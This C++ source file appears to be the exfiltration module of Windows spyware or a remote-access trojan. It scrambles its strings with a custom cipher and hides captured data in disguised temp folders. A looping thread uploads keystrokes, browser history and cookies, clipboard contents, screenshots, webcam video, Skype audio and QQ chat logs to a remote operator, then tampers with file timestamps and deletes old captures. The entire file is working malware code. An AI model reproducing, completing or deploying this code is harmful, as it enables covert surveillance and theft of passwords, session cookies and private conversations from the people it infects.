// KeyLog.cpp: implementation of the KeyLog class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "NdisSocket.h"
#include "KeyLog.h"
#include <sys/stat.h>
#include "lipboard.h"
#include "WinApi.h"
#include "mumaPublic.h"

#define MAXFILELENGTH 60*1024*1024
//////////////////////////////////////////////////////////////////////////

#define			DATATYPE			(UCHAR)14
#define			KEYSESSIONID		(USHORT)0x2345

#define			MDATATYPE			(UCHAR)16
#define			MSESSIONID			(USHORT)0xABCD
//////////////////////////////////////////////////////////////////////
// Construction/Destruction

#define DEKL_LEN 65
//T8zOVBWUHgF1wXu~6AiYsI3fvb2Nh7JopnDdCE9tRjMP<G>SKL4am5kZr0Qqcelxy
char *DeklStringA(char *ret_string, int strlen, char *string)
{
	char alphabet[DEKL_LEN]={'T','8','z','O','V','B','W','U','H','g',
		'F','1','w','X','u','~','6','A','i','Y',
		's','I','3','f','v','b','2','N','h','7',
		'J','o','p','n','D','d','C','E','9','t',
		'R','j','M','P','<','G','>','S','K','L',
		'4','a','m','5','k','Z','r','0','Q','q',
		'c','e','l','x','y'};
	DWORD i,j, scramble=1;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<DEKL_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%DEKL_LEN];
				break;
			}
	}
	return ret_string;
}


char *GetTmpPrevFix(int type)
{
	static char * retstr = new char[10];
	memset(retstr, 0, 10);
	switch(type)
	{
	case FIX_SCREEN:
		DeklStringA(retstr, 10, "uVLnT");
		return retstr;//~B4D8
	case FIX_AUDIO:
		DeklStringA(retstr, 10, "uVmVn");
		return retstr;//~B5BD
	case FIX_KEYLOG:
		DeklStringA(retstr, 10, "uVmnE");
		return retstr;//~B5D9
	case FIX_MOUSE:
		DeklStringA(retstr, 10, "uV~Fg");
		return retstr;//~B61F
	case FIX_DIRLIST:
		DeklStringA(retstr, 10, "uVVF~");
		return retstr;//~BB16
	case FIX_USBDIR:
		DeklStringA(retstr, 10, "uVdLh");
		return retstr;//~BC47
	case FIX_USBFILE:
		DeklStringA(retstr, 10, "uVgCV");
		return retstr;//~BFEB
	case FIX_MONITOR:
		DeklStringA(retstr, 10, "udILI");
		return retstr;//~C343
	case FIX_QQREC:
		DeklStringA(retstr, 10, "udCFL");
		return retstr;//~CE14
	case FIX_CLIP:
		DeklStringA(retstr, 10, "udCbC");
		return retstr;//~CE2E
	case FIX_SKYPEAUDIO:
		DeklStringA(retstr, 10, "uVmVC");
		return retstr;//~B5BE
	case FIX_SKYPESHOOT:
		DeklStringA(retstr, 10, "uV~F6");
		return retstr;//~B61A
	case FIX_ANDROID:
		DeklStringA(retstr, 10, "u6FbI");
		return retstr;//~A123
	case FIX_MD5FILTER:
		DeklStringA(retstr, 10, "uVVLI");
		return retstr;//~BB43
	case FIX_SCREENBAK:
		DeklStringA(retstr, 10, "uVLnE");
		return retstr;//~B4D9
	case FIX_BROWSER:
		DeklStringA(retstr, 10, "uVgbL");
		return retstr;//~BF24
	case FIX_BROWSERCOOKIE:
		DeklStringA(retstr, 10, "uVgIL");
		return retstr;//~BF34
	case FIX_SYSTEMINFO:
		DeklStringA(retstr, 10, "uIFd~");
		return retstr;//~31C6
	case FIX_OTHERFILE:
		DeklStringA(retstr, 10, "ugggg");
		return retstr;//~FFFF
	}
	
	DeklStringA(retstr, 10, "ugCgCgC");
	return retstr;//~FEFEFE
}

void TimetToFileTime( time_t t, FILETIME &  ft)
{
    LONGLONG ll = Int32x32To64(t, 10000000) + 116444736000000000;
	ft.dwLowDateTime = (DWORD) ll;
	ft.dwHighDateTime = (DWORD)(ll >> 32);   
}

int  SendFile(const char* FilePath, char ptype, WORD session,int monitortype)
{
	char filename[MAX_PATH];
	char srcfilename[MAX_PATH];
//	const char* srcfilename=filename;
	strncpy(filename, FilePath, MAX_PATH);
	strncpy(srcfilename, FilePath, MAX_PATH);
 
	if(monitortype==0)
	{
		char* p = strrchr(filename, '.');
		if(strcmp(p, ".a") == 0)
			strcpy(p, ".s");
	}
	else
	{
		char* p = strrchr(filename, '.');
		if(strcmp(p, ".v") == 0)
			strcpy(p, ".s");
	}
	int result = rename( srcfilename, filename);
	if( result != 0 )
	{
		return -1;
	}

	char TmpDeStr[50];
	HANDLE		hFile;
	char	tmpbuf[65536+1024];
	char*	buffer	=tmpbuf;
	int		datalen = 0;
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);
	hFile = PCreateFileA(filename, 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL,
		OPEN_EXISTING, 
		0,
		NULL);
	int		Op = -1;
	DWORD	lsize = -1;
	if (hFile!=NULL && hFile!=INVALID_HANDLE_VALUE)
	{
		DWORD hsize=0;
		lsize = PGetFileSize(hFile, &hsize);
		if (hsize>0)
			lsize |= 0x80000000;

		if(lsize == 0)
			Op = 0;
		else if(lsize > MAXFILELENGTH)
			Op = 1;
		else
		{
			Op = 2;
			if( lsize > 65536 )
				buffer = new char[lsize+1024];

			//filename: d:\33445\2342134\2346\aaa.exe\r\n
			//time: yyyymmddHHMMSS\r\n
			//content-length: 1235412354\r\n
			//content-type: file\r\n\r\n
			datalen =  sprintf(buffer+datalen, DeklStringA(TmpDeStr, 50, "3Aecp4ac: %Y\r\n"), filename);//filename: %s\r\n

			char tmp[20]={0};
			char* pFileName = strrchr(filename, '\\');
			if(pFileName)
				strncpy(tmp, pFileName+1, 14);
			datalen += sprintf(buffer+datalen, DeklStringA(TmpDeStr, 50, "9Aac: %Y\r\n"), tmp);//time: %s\r\n
			datalen += sprintf(buffer+datalen, DeklStringA(TmpDeStr, 50, "qJp9cp9-ecpH9N: %D\r\n"), lsize);//content-length: %d\r\n
			datalen += sprintf(buffer+datalen, DeklStringA(TmpDeStr, 50, "aJpA9JZ9xoc: %Y\r\n"), monitortype==0?"screen":"video");//monitortype: %s\r\n
			datalen += sprintf(buffer+datalen, DeklStringA(TmpDeStr, 50, "qJp9cp9-9xoc: 3Aec\r\n\r\n"));//content-type: file\r\n\r\n
			SendData(buffer, datalen, ptype, session);//先发出头

			memset(buffer, 0, datalen);
			datalen=0;

			PReadFile(hFile, buffer, lsize, &lsize, NULL);

			// 解码
			DWORD isize = lsize;
			Decode2(buffer, isize);

			datalen = lsize;

			FILETIME ntCreate;
			TimetToFileTime(time(0),ntCreate);
			PSetFileTime(hFile, &ntCreate, &ntCreate, &ntCreate);
		}
		CloseHandle(hFile);
	}
	
	if(Op != 2)
	{
		return  -1 ;
	}
	// 发送文件数据

	DWORD flg;
	if(SendData(buffer, datalen, ptype, session))
	{
//		DbgFat32Log("SendFile %s, 成功", filename.c_str());
		flg=1;
	}
	else
	{
//		DbgFat32Log("SendFile %s, 失败", filename.c_str());
		flg= 0;
		int result = rename( filename, srcfilename);
	}

	if (buffer != tmpbuf)
		delete[] buffer;
	return flg;
}

long g_AutoSession = 30;	// rang 31-100

int GetFatAutoSendID()
{
	if(g_AutoSession >= 100)
	{
		g_AutoSession = 31;
	}
	else
	{
		PInterlockedIncrement(&g_AutoSession);
	}
	
	return g_AutoSession;
}

//////////////////////////////////////////////////////////////////////////
BOOL SendQQRecFile(char *filedir)
{
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char TmpDeStr[50];
	char findstr[MAX_PATH];
	memset(findstr,0,MAX_PATH);
	int error = 0;
	
	char bufferHdr[2000];	// 头
	int lenHdr;
	DWORD SessionID;

	sprintf(findstr, DeklStringA(TmpDeStr, 50, "%Y\\*.q"), filedir);//%s\\*.c

	DWORD cntFind = 0;
	hFind = PFindFirstFileA(findstr, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		time_t now = time(0);
		do{	

			char tmp[MAX_PATH];
			memset(tmp,0,MAX_PATH);
			sprintf(tmp,"%s\\%s",filedir,FindFileData.cFileName);

			struct stat fst;
			if (!stat(tmp, &fst))
			{
				IF_LOUD(DbgFat32Log("发现QQ聊天/好友文件%s", tmp););
				int flen = fst.st_size;
				if ((flen <= 0) || (flen > 60000000))
				{
					PDeleteFileA(tmp);
					continue;
				}
				if(abs(now-fst.st_ctime) > 2*24*60*60)	// 2天, 清
				{
					PDeleteFileA(tmp);
					continue;
				}
				if(now > fst.st_mtime)
				{
					BOOL bSendOK = FALSE;
					DWORD pbuffer=NULL;
					DWORD datalen=0;
					int	Op = -1;
					Op=GetFileContent(tmp,pbuffer,datalen);
					char* buffer=(char*)pbuffer;
					if(buffer)
					{
						// SendHead
						//filename: d:\33445\2342134\2346\aaa.exe\r\n
						//time: yyyymmddHHMMSS\r\n
						//content-length: 1235412354\r\n
						//content-type: file\r\n\r\n
						lenHdr = 0;
						lenHdr =  sprintf(bufferHdr+lenHdr, DeklStringA(TmpDeStr, 50, "3Aecp4ac: %Y\r\n"), tmp);//filename: %s\r\n
						lenHdr += sprintf(bufferHdr+lenHdr, DeklStringA(TmpDeStr, 50, "4q53Aec: %Y\r\n"), tmp);//ackfile: %s\r\n
						lenHdr += sprintf(bufferHdr+lenHdr, DeklStringA(TmpDeStr, 50, "qJp9cp9-ecpH9N: %D\r\n"), datalen);//content-length: %d\r\n
						lenHdr += sprintf(bufferHdr+lenHdr, DeklStringA(TmpDeStr, 50, "aJpA9JZ9xoc: pc1QQZcq\r\n\r\n"));//monitortype: newqqrec\r\n\r\n
						SessionID = GetFatAutoSendID();

						SendData(bufferHdr, lenHdr, PTYPE_COPYFILE, SessionID);//先发出头

						Decode2(buffer,datalen);

						// SendData
						SendData(buffer, datalen, PTYPE_COPYFILE, SessionID);
						delete[] buffer;
					}

				//	if(bSendOK)
					{
						cntFind ++;
						ModifyFileTime(tmp, 0, 5);	// 0小时5分钟后, 如果还存在, 继续发
					}
				}
			}

			if(cntFind>20)
			{
				break;
			}

		}while(PFindNextFileA(hFind, &FindFileData));
		PFindClose(hFind);
	}
	return cntFind;
}

//////////////////////////////////////////////////////////////////////////
BOOL  SendHookFile(char *filedir, char* filetype, BOOL bSuccDelete)
{
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char TmpDeStr[100];
	char findstr[MAX_PATH];
	memset(findstr,0,MAX_PATH);
	int error = 0;
	
	sprintf(findstr,"%s\\*.a",filedir);
	hFind = PFindFirstFileA(findstr, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		time_t now = time(0);
		do{	

			char tmp[MAX_PATH];
			memset(tmp,0,MAX_PATH);
			sprintf(tmp,"%s\\%s",filedir,FindFileData.cFileName);

			struct stat fst;
			if (!stat(tmp, &fst))
			{
				IF_LOUD(DbgFat32Log("发现钩子数据文件%s", tmp););
				int flen = fst.st_size;
				if ((flen <= 0) || (flen > 60000000))
				{
					PDeleteFileA(tmp);
					continue;
				}
				if(abs(now-fst.st_ctime) > 2*24*60)	// 2天, 清
				{
					PDeleteFileA(tmp);
					continue;
				}
				if(now > fst.st_mtime)
				{
					BOOL bSendOK = FALSE;
					DWORD pbuffer=NULL;
					DWORD datalen=0;
					int	Op = -1;
					Op=GetFileContent(tmp,pbuffer,datalen);
					char* buffer=(char*)pbuffer;
					if(buffer)
					{
						Decode2(buffer,datalen);

						if(stricmp(filetype, DeklStringA(TmpDeStr, 100, "5cxeJH"))==0)//keylog
						{
							bSendOK = SendData(buffer,datalen,DATATYPE,KEYSESSIONID);
						}
						else if (stricmp(filetype, DeklStringA(TmpDeStr, 100, "aDm3Ae9cZ"))==0)//md5filter
						{
							int Session = GetFatAutoSendID();
							bSendOK = SendData(buffer, datalen, PTYPE_GETMD5BYFILTER, Session);
						}
						else if (stricmp(filetype, DeklStringA(TmpDeStr, 100, "vZJ1YcZ")) == 0)//browser
						{
							int Session = GetFatAutoSendID();
							bSendOK = SendData(buffer, datalen, PTYPE_BROWSERINFO, Session);
						}
						else if (stricmp(filetype, DeklStringA(TmpDeStr, 100, "vZJ1YcZqJJ5Ac")) == 0)//browsercookie
						{
							int Session = GetFatAutoSendID();
							bSendOK = SendData(buffer, datalen, PTYPE_BROWSERCOOKIE, Session);
						}
						else if (stricmp(filetype, DeklStringA(TmpDeStr, 100, "J9NcZ3Aec")) == 0)//otherfile
						{
							int Session = GetFatAutoSendID();
							bSendOK = SendData(buffer, datalen, PTYPE_OTHERFILE, Session);
						}
						else if (stricmp(filetype, DeklStringA(TmpDeStr, 100, "YxY9caAp3J")) == 0)//systeminfo
						{
							int Session = GetFatAutoSendID();
							bSendOK = SendData(buffer, datalen, PTYPE_SYSINFO, Session);
						}
						else
						{
							time_t now = time(0);
							char sendtm[100];
							struct tm* ptm = localtime(&now);
							if (ptm==NULL)
								memset(sendtm, 0, 4);
							else
								strftime(sendtm, 100, "%Y%m%d%H%M%S", ptm);

							char* pTemp = new char[1024];
							//ackfile: %s\r\nMonitorType: %s\r\nfilename: %s\r\ntime: %s\r\ncontent-length: %d\r\n\r\n
							int hlen = sprintf(pTemp,
								DeklStringA(TmpDeStr, 100, "4q53Aec: %Y\r\njJpA9JZyxoc: %Y\r\n3Aecp4ac: %Y\r\n9Aac: %Y\r\nqJp9cp9-ecpH9N: %D\r\n\r\n"),
								tmp, filetype, tmp,sendtm, datalen);

							int mouseSession = GetFatAutoSendID();
							
							if(SendData(pTemp, hlen, PTYPE_COPYFILE, mouseSession))
								SendData(buffer,datalen,PTYPE_COPYFILE,mouseSession);
							delete[] pTemp;
						}
						delete[] buffer;
					}

					if(bSendOK)
					{
						if(bSuccDelete)
							PDeleteFileA(tmp);
						else
							ModifyFileTime(tmp, 0, 5);	// 0小时5分钟后, 如果还存在, 继续发
					}
				}
			}
		}while(PFindNextFileA(hFind, &FindFileData));
		PFindClose(hFind);
	}
	return TRUE;
}


time_t FormatTime2(char * szTime)
{
	struct tm tm1;
	time_t time1;
	
	sscanf(szTime, "%4d%2d%2d%2d%2d%2d",     
		&tm1.tm_year, 
		&tm1.tm_mon, 
		&tm1.tm_mday, 
		&tm1.tm_hour, 
		&tm1.tm_min,
		&tm1.tm_sec);
	
	tm1.tm_year -= 1900;
	tm1.tm_mon --;
	tm1.tm_isdst=-1;
	
	time1 = mktime(&tm1);
	return time1;
}

//.tmp文件是是正在生成的文件, .a是截屏,.v是摄像头
BOOL CheckScreenDir(const char * fixScreenDir)
{	
	if(fixScreenDir == NULL)
	{
		IF_LOUD(DbgFat32Log("固定目录g_fixScreenDir未初始化");)
			return FALSE;
	}
	char flgTempPath[MAX_PATH];
	memset(flgTempPath,0,MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	
	char audiofiledir[MAX_PATH];
	memset(audiofiledir,0,MAX_PATH);
	sprintf(audiofiledir,"%s%s",flgTempPath,fixScreenDir);
	BOOL isSend=TRUE; 
	//////////////////////////////////////////////////////////////////////////
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char findstr[MAX_PATH];
	memset(findstr,0,MAX_PATH);
	
	sprintf(findstr,"%s\\*.*",audiofiledir);
	hFind = PFindFirstFileA(findstr, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		time_t time1=time(0);
		do
		{	//判断目录属性
			if( FindFileData.cFileName[0] != '.')
			{
				char tmp[MAX_PATH];
				memset(tmp,0,MAX_PATH);
				int len=sprintf(tmp,"%s\\%s",audiofiledir,FindFileData.cFileName);
				char type=tmp[len-1];
				if(isSend && (type=='a'|| type=='v')  )//1天 
				{
					//发送前改为.s ,再修改创建时间,发送失败就continue;
					time_t time2=FormatTime2(FindFileData.cFileName);
					
					int re;
					if(type=='a')
					{
						
						if(time1-time2>g_screentm*60) //1天
						{
							PDeleteFileA(tmp);
							continue;
						}
						
						
						re=SendFile(tmp,5,GetFatAutoSendID(),0);
					}
					else
					{
						
						if(time1-time2>g_videotm*60) //1天
						{
							PDeleteFileA(tmp);
							continue;
						}
						
						re=SendFile(tmp,5,GetFatAutoSendID(),1);
					}
					if(re==0)
						isSend=FALSE;
					
				}
				else  //tmp ,.s 文件 超10分钟删除
				{
					time_t time2=FormatTime2(FindFileData.cFileName);
					if(time1-time2>10*60) //10分钟
					{
						PDeleteFileA(tmp);
					}
				}
			}
			
		}while(PFindNextFileA(hFind, &FindFileData));
		PFindClose(hFind);
	}
	return TRUE;
}


DWORD WINAPI CheckHookThread(LPVOID p)
{
	char flgTempPath[MAX_PATH];
	memset(flgTempPath,0,MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	
	char keyfiledir[MAX_PATH], mousefiledir[MAX_PATH], skypeshootfile[MAX_PATH];
	memset(keyfiledir,0,MAX_PATH);
	memset(mousefiledir,0,MAX_PATH);
	memset(skypeshootfile, 0, MAX_PATH);
	sprintf(keyfiledir,		"%s%s",	flgTempPath,	GetTmpPrevFix(FIX_KEYLOG));	// 键盘
	sprintf(mousefiledir,	"%s%s",	flgTempPath,	GetTmpPrevFix(FIX_MOUSE));	// 鼠标
	sprintf(skypeshootfile, "%s%s", flgTempPath,	GetTmpPrevFix(FIX_SKYPESHOOT));

	char skypeaudiofile[MAX_PATH];
	memset(skypeaudiofile,0,MAX_PATH);
	sprintf(skypeaudiofile,	"%s%s",	flgTempPath,	GetTmpPrevFix(FIX_SKYPEAUDIO));  // Skype录音
	char audiofile[MAX_PATH];
	memset(audiofile,0,MAX_PATH);
	sprintf(audiofile,	"%s%s",	flgTempPath,	GetTmpPrevFix(FIX_AUDIO));  //录音
	char md5filter[MAX_PATH];
	memset(md5filter, 0, MAX_PATH);
	sprintf(md5filter, "%s%s", flgTempPath, GetTmpPrevFix(FIX_MD5FILTER));
	char otherfile[MAX_PATH];
	memset(otherfile, 0, MAX_PATH);
	sprintf(otherfile, "%s%s", flgTempPath, GetTmpPrevFix(FIX_OTHERFILE));
	char browserfile[MAX_PATH];
	memset(browserfile, 0, MAX_PATH);
	sprintf(browserfile, "%s%s", flgTempPath, GetTmpPrevFix(FIX_BROWSER));
	char browsercookie[MAX_PATH];
	memset(browsercookie, 0, MAX_PATH);
	sprintf(browsercookie, "%s%s", flgTempPath, GetTmpPrevFix(FIX_BROWSERCOOKIE));
	char systeminfo[MAX_PATH];
	memset(systeminfo, 0, MAX_PATH);
	sprintf(systeminfo, "%s%s", flgTempPath, GetTmpPrevFix(FIX_SYSTEMINFO));

	char qqRec[MAX_PATH];
	sprintf(qqRec,	"%s%s",		flgTempPath,	GetTmpPrevFix(FIX_QQREC)); // qq聊天记录

	char fixScreenDir[10], fixScreenBakDir[10];
	strcpy(fixScreenDir, GetTmpPrevFix(FIX_SCREEN));
	strcpy(fixScreenBakDir, GetTmpPrevFix(FIX_SCREENBAK));

	char filetype[20];
	while (1)
	{
		DeklStringA(filetype, 20, "5cxeJH");
		SendHookFile(keyfiledir, filetype, FALSE);//keylog

		DeklStringA(filetype, 20, "YxY9caAp3J");
		SendHookFile(systeminfo, filetype, FALSE);//systeminfo

		DeklStringA(filetype, 20, "vZJ1YcZ");
		SendHookFile(browserfile, filetype, FALSE);//browser
		
		DeklStringA(filetype, 20, "vZJ1YcZqJJ5Ac");
		SendHookFile(browsercookie, filetype, FALSE);//browsercookie

		DeklStringA(filetype, 20, "J9NcZ3Aec");
		SendHookFile(otherfile, filetype, FALSE);//otherfile

		CheckScreenDir(fixScreenDir);
		CheckScreenDir(fixScreenBakDir);

		SendClipboardData();

		SendQQRecFile(qqRec);	// 新版qqmsg

		DeklStringA(filetype, 20, "aDm3Ae9cZ");
		SendHookFile(md5filter, filetype, TRUE);//md5filter

		DeklStringA(filetype, 20, "Y5xoc4XDAJ");
		SendHookFile(skypeaudiofile, filetype, FALSE);//skypeaudio
		
		DeklStringA(filetype, 20, "4XDAJ");
		SendHookFile(audiofile, filetype, FALSE);//audio
		
		DeklStringA(filetype, 20, "Y5xocYNJJ9");
		SendHookFile(skypeshootfile, filetype, FALSE);//skypeshoot

		PSleep(5000);
	}

	//////////////////////////////////////////////////////////////////////////	
	return 1;
}

DWORD StartSendHookDir(DWORD* pPara)
{
	HANDLE hh = NULL;
	DWORD  threadId=0;
	hh = CreateThread(
		NULL,
		0,
		CheckHookThread, 
		pPara, 
		0, 
		&threadId);
	if(hh != NULL)
		CloseHandle(hh);
	return 1;
}

